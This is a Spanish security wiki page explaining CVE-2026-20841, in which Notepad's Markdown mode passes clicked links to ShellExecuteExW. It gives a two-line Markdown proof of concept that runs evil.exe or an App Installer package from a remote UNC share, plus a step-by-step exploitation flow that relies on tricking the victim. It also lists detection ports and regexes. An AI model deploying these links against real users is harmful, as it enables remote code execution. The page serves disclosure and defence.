# Abuso de controladores de protocolo de Windows / ShellExecute (renderizadores Markdown)

{{#include ../banners/hacktricks-training.md}}

Las aplicaciones de Windows que renderizan Markdown o HTML pueden enviar los destinos seleccionados a `ShellExecuteExW`. Como ShellExecute ejecuta los esquemas URI y las asociaciones de archivos registrados, un renderizador necesita una lista explícita de permitidos, en lugar de asumir que todos los enlaces son HTTP(S). El comportamiento de Notepad que se describe a continuación corresponde a CVE-2026-20841 y no debe generalizarse a todos los renderizadores.<sup>[[1]](#references)[[3]](#references)</sup>

## Superficie de `ShellExecuteExW` en el modo Markdown de Windows Notepad
- Notepad elige el modo Markdown **solo para las extensiones `.md`** mediante una comparación fija de cadenas en `sub_1400ED5D0()`.<sup>[[1]](#references)</sup>
- Enlaces Markdown compatibles:
  - Estándar: `[text](target)`
  - Autolink: `<target>` (se renderiza como `[target](target)`), por lo que ambas sintaxis son relevantes para los payloads y su detección.
- Los clics en enlaces se procesan en `sub_140170F60()`, que aplica un filtrado débil y luego llama a `ShellExecuteExW`.
- `ShellExecuteExW` ejecuta **cualquier controlador de protocolo configurado**, no solo HTTP(S).<sup>[[1]](#references)</sup>

### Consideraciones sobre los payloads
- Cualquier secuencia `\\` en el enlace se **normaliza a `\`** antes de llamar a `ShellExecuteExW`, lo que afecta la creación y detección de rutas/UNC.
- Los archivos `.md` **no están asociados con Notepad de forma predeterminada**; la víctima aún debe abrir el archivo en Notepad y hacer clic en el enlace, pero una vez renderizado, se puede hacer clic en él.
- Ejemplos de esquemas peligrosos:<sup>[[1]](#references)</sup>
  - `file://` para ejecutar un payload local o UNC.
  - `ms-appinstaller://` para activar los flujos de App Installer. Otros esquemas registrados localmente también podrían ser vulnerables.

### PoC mínimo en Markdown
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```

### Flujo de explotación
1. Crea un **archivo `.md`** para que Notepad lo muestre como Markdown.
2. Inserta un enlace que use un esquema URI peligroso (`file:`, `ms-appinstaller:` o cualquier controlador instalado).
3. Entrega el archivo (HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB o similar) y convence al usuario de que lo abra en Notepad.
4. Al hacer clic, el **enlace normalizado** se pasa a `ShellExecuteExW` y el controlador de protocolo correspondiente ejecuta el contenido referenciado en el contexto del usuario.<sup>[[1]](#references)[[2]](#references)</sup>

## Ideas de detección
- Supervisa las transferencias de archivos `.md` por puertos/protocolos que suelen usarse para entregar documentos: `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Analiza los enlaces Markdown (estándar y autolinks) y busca `file:` o `ms-appinstaller:` **sin distinguir entre mayúsculas y minúsculas**.
- Expresiones regulares recomendadas por proveedores para detectar el acceso a recursos remotos:
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- La corrección del proveedor descrita por ZDI restringe los destinos aceptados a archivos locales y HTTP(S). Amplía las detecciones a otros manejadores de protocolo instalados según sea necesario, ya que la superficie de ataque registrada varía según el sistema.<sup>[[1]](#references)</sup>

## References
- [1] [CVE-2026-20841: Ejecución arbitraria de código en el Bloc de notas de Windows](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [2] [PoC de CVE-2026-20841](https://github.com/BTtea/CVE-2026-20841-PoC)
- [3] [Microsoft Learn — `ShellExecuteExW`](https://learn.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecuteexw)
{{#include ../banners/hacktricks-training.md}}
